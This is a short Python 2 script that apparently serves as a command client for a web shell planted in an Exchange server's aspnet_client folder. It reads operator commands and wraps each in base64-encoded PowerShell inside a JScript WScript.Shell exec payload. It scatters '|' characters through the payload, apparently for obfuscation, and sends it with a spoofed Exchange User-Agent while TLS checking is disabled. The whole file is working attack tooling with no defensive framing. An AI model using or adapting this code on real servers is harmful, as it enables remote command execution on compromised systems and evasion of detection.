import urllib2
import httplib
import sys
import base64
import os
import ssl
import json
import random
import re
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE



URL = "https://target.com/aspnet_client/TEST2.aspx"
print URL


def powershell_encode(data):
    blank_command = ""
    powershell_command = ""
    n = re.compile(u'(\xef|\xbb|\xbf)')
    for char in (n.sub("", data)):
        blank_command += char + "\x00"
    powershell_command = blank_command
    powershell_command = base64.b64encode(powershell_command.encode())
    return powershell_command.decode("utf-8")



while True:
    cm = raw_input('>')
    cm = 'powershell -enc ' + powershell_encode(cm)
    cm = 'Response.Write(new ActiveXObject("WScript.Shell").exec("'+cm+'").StdOut.ReadAll());'
    
    
    for i in range(1,290):
        index = random.randint(0,len(cm))
        t = list(cm)
        t.insert(index,'|')
        cm = "".join(t)
    print cm
    data = ("REQ="+cm).replace(' ','+')
	
    r = urllib2.Request(URL,data=data,headers={
                                                         'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                         'Content-Type':'application/x-www-form-urlencoded',
               
                                                         })

    try:
        r = urllib2.urlopen(r,context=ctx)
        print r.code
        print r.read()
    except Exception as e:
        print e    
        r = e
        print r.read()
